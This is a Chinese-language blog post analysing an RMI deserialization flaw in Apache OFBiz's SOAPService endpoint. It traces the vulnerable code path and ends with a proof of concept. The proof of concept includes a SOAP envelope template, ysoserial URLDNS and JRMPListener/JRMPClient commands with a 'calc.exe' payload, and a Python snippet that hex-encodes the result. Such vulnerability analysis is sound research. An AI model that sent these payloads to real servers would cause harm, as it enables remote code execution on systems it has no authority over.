> 原文链接: https://www.anquanke.com//post/id/237123 


# Apache Ofbiz RMI反序列化分析


                                阅读量   
                                **104730**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0187b13ee541cc356e.jpg)](https://p2.ssl.qhimg.com/t0187b13ee541cc356e.jpg)



## 环境搭建

代码下载：[https://archive.apache.org/dist/ofbiz/](https://archive.apache.org/dist/ofbiz/)<br>
利用idea导入<br>
具体搭建可参考：[https://blog.csdn.net/GOon_star/article/details/79285584](https://blog.csdn.net/GOon_star/article/details/79285584)<br>
若成功启动，控制台应该有如下呈现：

[![](https://p1.ssl.qhimg.com/t016da4f5d2a5f5502a.png)](https://p1.ssl.qhimg.com/t016da4f5d2a5f5502a.png)



## 漏洞分析

对于rmi反序列化，官方作出了修补，修补链接：[https://github.com/apache/ofbiz-framework/commit/00200bfaca296991a6d1925423c71d74842882b0](https://github.com/apache/ofbiz-framework/commit/00200bfaca296991a6d1925423c71d74842882b0)

对比修改前后，对SafeObjectInputStream类添加了rmi类校验，将java.rmi.server纳入了黑名单，如果类名出现了java.rmi.server则告警，并返回空

[![](https://p0.ssl.qhimg.com/t0147a789321a0521e2.png)](https://p0.ssl.qhimg.com/t0147a789321a0521e2.png)

### <a class="reference-link" name="%E8%BF%BD%E6%BA%AF"></a>追溯

既然对该文件进行了修补，以apache-ofbiz-17.12.05为例，我们对其进行回溯。<br>
因为是对SafeObjectInputStream类进行的修补，我们查看在哪儿调用了SafeObjectInputStream类。<br>
SafeObjectInputStream被UtilObject类调用，给出关键代码：

```
public static Object getObjectException(byte[] bytes) throws ClassNotFoundException, IOException `{`
        try (ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
                SafeObjectInputStream wois = new SafeObjectInputStream(bis)) `{`
            return wois.readObject();
        `}`
    `}`
```

看见readobject方法，所以判断在这里进行了反序列化。

我们继续回溯，有两个类调用了getObjectException方法：分别是EntityCrypto的doDecrypt方法和UtilObject的getobject方法

[![](https://p2.ssl.qhimg.com/t01365bc655e543c873.png)](https://p2.ssl.qhimg.com/t01365bc655e543c873.png)

我们尝试顺着UtilObject找。<br>
getobject被多处调用，既然是请求处发送而来，我们就顺着潜在请求口去回溯

[![](https://p4.ssl.qhimg.com/t013f0f5f6550850ccd.png)](https://p4.ssl.qhimg.com/t013f0f5f6550850ccd.png)

起先是跟着RequestHandler::doRequest，关键代码：

```
byte[] reqAttrMapBytes = StringUtil.fromHexString(preReqAttStr);
Map&lt;String, Object&gt; preRequestMap = checkMap(UtilObject.getObject(reqAttrMapBytes), String.class, Object.class);
......
String preReqAttStr = (String) request.getSession().getAttribute("_REQ_ATTR_MAP_");
```

追到这出了问题，无法进一步回溯了，转而寻找其他类，这次将类转到XmlSerializer，定位到deserializeCustom方法，取出关键代码如下：

```
public static Object deserializeCustom(Element element) throws SerializeException `{`
        String tagName = element.getLocalName();
        if ("cus-obj".equals(tagName)) `{`
            String value = UtilXml.elementValue(element);
            if (value != null) `{`
                byte[] valueBytes = StringUtil.fromHexString(value);
                if (valueBytes != null) `{`
                    Object obj = UtilObject.getObject(valueBytes);
                    if (obj != null) `{`
                        return obj;
                    `}`
                `}`
            `}`
            throw new SerializeException("Problem deserializing object from byte array + " + element.getLocalName());
        `}`
        throw new SerializeException("Cannot deserialize element named " + element.getLocalName());
    `}`
```

其实到这一步，可以解释问题那就是为什么将payload要插入到cus-obj中，以及为什么需要将payload进行hex编码：deserializeCustom取出cus-obj标签中的值，然后将其进行hex解码，将结果传给valueBytes，valueBytes再作为UtilObject.getObject的参数进行处理。<br>
我们进一步回溯：<br>
deserializeSingle调用了deserializeCustom，这个方法的作用概括就是对xml标签进行解析，获取各个标签的值：

[![](https://p2.ssl.qhimg.com/t01a4a9005f73e1c0c5.png)](https://p2.ssl.qhimg.com/t01a4a9005f73e1c0c5.png)

继续追溯，deserialize方法调用了deserializeSingle

```
/** Deserialize a Java object from a DOM &lt;code&gt;Document&lt;/code&gt;.
     * &lt;p&gt;This method should be used with caution. If the DOM &lt;code&gt;Document&lt;/code&gt;
     * contains a serialized &lt;code&gt;GenericValue&lt;/code&gt; or &lt;code&gt;GenericPK&lt;/code&gt;
     * then it is possible to unintentionally corrupt the database.&lt;/p&gt;
     *
     * @param document the document
     * @param delegator the delegator
     * @return returns a deserialized object from a DOM document
     * @throws SerializeException
     */
    public static Object deserialize(Document document, Delegator delegator) throws SerializeException `{`
        Element rootElement = document.getDocumentElement();
        // find the first element below the root element, that should be the object
        Node curChild = rootElement.getFirstChild();
        while (curChild != null &amp;&amp; curChild.getNodeType() != Node.ELEMENT_NODE) `{`
            curChild = curChild.getNextSibling();
        `}`
        if (curChild == null) `{`
            return null;
        `}`
        return deserializeSingle((Element) curChild, delegator);
    `}`
```

deserialize方法的作用在于反序列化一个来源于dom的java对象。<br>
然后发现SoapSerializer类调用了deserialize方法：

```
public class SoapSerializer `{`
    public static final String module = SoapSerializer.class.getName();
    public static Object deserialize(String content, Delegator delegator) throws SerializeException, SAXException, ParserConfigurationException, IOException `{`
        Document document = UtilXml.readXmlDocument(content, false);
        if (document != null) `{`
            return XmlSerializer.deserialize(document, delegator);
        `}`
        Debug.logWarning("Serialized document came back null", module);
        return null;
    `}`
    public static String serialize(Object object) throws SerializeException, FileNotFoundException, IOException `{`
        Document document = UtilXml.makeEmptyXmlDocument("ofbiz-ser");
        Element rootElement = document.getDocumentElement();
        rootElement.appendChild(XmlSerializer.serializeSingle(object, document));
        return UtilXml.writeXmlDocument(document);
    `}`
`}`
```

SoapSerializer类实现了两个方法，一个序列化，一个反序列化，我们关注的必然是反序列化方法，查看哪一个类调用了deserialize方法，然后定位到SOAPEventHandler类invoke方法调用deserialize，我只截取部分重要代码：

```
SOAPBody reqBody = reqEnv.getBody();
            validateSOAPBody(reqBody);
            OMElement serviceElement = reqBody.getFirstElement();
            serviceName = serviceElement.getLocalName();
            Map&lt;String, Object&gt; parameters = UtilGenerics.cast(SoapSerializer.deserialize(serviceElement.toString(), delegator));
        // get the service name and parameters
        try `{`
            InputStream inputStream = (InputStream) request.getInputStream();
            SOAPModelBuilder builder = (SOAPModelBuilder) OMXMLBuilderFactory.createSOAPModelBuilder(inputStream, "UTF-8");
            reqEnv = (SOAPEnvelope) builder.getDocumentElement();
```

SOAPEventHandler类会对请求request做处理，并以text/xml的格式返回响应。<br>
我们似乎找到了最开始处理请求的地方，关键点在于，如何去寻求一个请求输入点呢？<br>
这里涉及到ofbiz的技术架构，参考文章：[https://blog.csdn.net/yanghua_kobe/article/details/43868773](https://blog.csdn.net/yanghua_kobe/article/details/43868773)<br>
我摘取其中关于如何处理请求的一段话：

> <p>（1）客户端浏览器向web服务器发出一个请求(http/https)，请求会被web容器接收并作相应的处理（比如参数的封装等）。<br>
（2）请求被路由到一个代理servlet中，该servlet会分析请求是发往哪个app的，然后再到该项目的下的controller.xml配置文件中去匹配request-map配置项，该配置项用于只是OFBiz如何处理这个请求。通常的处理过程是先进行安全检查以及权限确认，然后触发某个“事件”或者服务调用，最后会以一个view作为响应。如果是以一个view作为响应的话，OFBiz会去view-map中匹配该视图，每一个视图view都有它对应的handler。<br>
（3）OFBiz会用配置的handler来处理该view。handler的作用主要用于渲染页面元素，并将需要展示的数据跟页面元素合并。</p>

webcommon/WEB-INF/handlers-controller.xml定义了soap请求交由SOAPEventHandler处理

```
&lt;handler name="soap" type="request" class="org.apache.ofbiz.webapp.event.SOAPEventHandler"/&gt;
```

在serviceengine.xml定义了存在的引擎、需要调用的服务及其存在的位置，我注意到如下一行

```
&lt;service-location name="main-soap" location="http://localhost:8080/webtools/control/SOAPService"/&gt;
```

定义了soap服务的url<br>
在webapp/content/WEB-INF/web.xml中，定义了`/control/*`路由下的请求会交给ControlServlet处理

```
&lt;servlet-mapping&gt;
        &lt;servlet-name&gt;ControlServlet&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/control/*&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
```

在webapp/webtools/WEB-INF/controller.xml中配置了路由映射关系，soapservice的路由映射如下

```
&lt;request-map uri="SOAPService"&gt;
        &lt;security https="false"/&gt;
        &lt;event type="soap"/&gt;
        &lt;response name="error" type="none"/&gt;
        &lt;response name="success" type="none"/&gt;
    &lt;/request-map&gt;
```

这里指定了SOAPService将会交由event类型为soap去处理。<br>
中间过程是如何发生的呢：<br>
当我们访问[http://localhost:8080/webtools/control/SOAPService时，由于web.xml的原因，ControlServlet会处理该请求。](http://localhost:8080/webtools/control/SOAPService%E6%97%B6%EF%BC%8C%E7%94%B1%E4%BA%8Eweb.xml%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8CControlServlet%E4%BC%9A%E5%A4%84%E7%90%86%E8%AF%A5%E8%AF%B7%E6%B1%82%E3%80%82)<br>
它会调用getRequestHandler，具体代码如下：

```
protected RequestHandler getRequestHandler() `{`
        return RequestHandler.getRequestHandler(getServletContext());
    `}`
```

当前servlet的上下文会作为参数传递给RequestHandler.getRequestHandler，而getRequestHandler会去调用RequestHandler方法，给出部分关键代码：

```
private RequestHandler(ServletContext context) `{`
        // init the ControllerConfig, but don't save it anywhere, just load it into the cache
        this.controllerConfigURL = ConfigXMLReader.getControllerConfigURL(context);
        try `{`
            ConfigXMLReader.getControllerConfig(this.controllerConfigURL);
            ......
```

获取xml的配置信息，涉及到了ConfigXMLReader.getControllerConfigURL：

```
public static URL getControllerConfigURL(ServletContext context) `{`
        try `{`
            return context.getResource(controllerXmlFileName);
        `}` catch (MalformedURLException e) `{`
            Debug.logError(e, "Error Finding XML Config File: " + controllerXmlFileName, module);
            return null;
        `}`
    `}`
```

这里的controllerXmlFileName就是”/WEB-INF/controller.xml”，获取controller.xml<br>
中的相应映射关系，后续便是根据相应的映射关系，分配handler，处理请求。<br>
所以我们请求前文所提到soapservice服务，便将会由org.apache.ofbiz.webapp.event.SOAPEventHandler去处理该请求。



## 构造构造

### <a class="reference-link" name="URLDNS%E5%88%A9%E7%94%A8URLDNS%E5%88%A9%E7%94%A8"></a>URLDNS利用URLDNS利用

```
&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://ofbiz.apache.org/service/"&gt;
&lt;soapenv:Header/&gt;
&lt;soapenv:Body&gt;
&lt;ns1:clearCacheLineByValue&gt;
&lt;ns1:cus-obj&gt;[payload]&lt;/ns1:cus-obj&gt;
&lt;/ns1:clearCacheLineByValue&gt;
&lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
```

执行命令：

```
java','-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', "URLDNS",[dnslog]

```

将结果转hex，粘贴到payload处<br>
得到回显

[![](https://p0.ssl.qhimg.com/t01fbfc6a4be2ee3ea5.png)](https://p0.ssl.qhimg.com/t01fbfc6a4be2ee3ea5.png)

### <a class="reference-link" name="rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>rmi反序列化rmi反序列化

攻击者：

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsBeanutils1 "calc.exe"
```

客户端：

```
popen = subprocess.Popen(['java','-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', "JRMPClient", "127.0.0.1:9999"], stdout=subprocess.PIPE)
data = popen.stdout.read()
data.hex()
```

[![](https://p4.ssl.qhimg.com/t01fadb8d0558844e6d.png)](https://p4.ssl.qhimg.com/t01fadb8d0558844e6d.png)

原安装包下，由于common-collections的版本问题，并不能直接成功rce，为了达到rce的目的，我替换了common-collections3.2.2为common-collections3.1，然后按照上述步骤执行命令，成功执行命令，弹出了计算器。

[![](https://p2.ssl.qhimg.com/t012e8cdd5bf6d0b0c9.png)](https://p2.ssl.qhimg.com/t012e8cdd5bf6d0b0c9.png)

基于各种开发环境，并不一定能够达到rce的效果，而urldns作为一种默认通用类，也并没有将其认定为危险类，利用urldns也仅是作为验证目标机器是否能够出网。
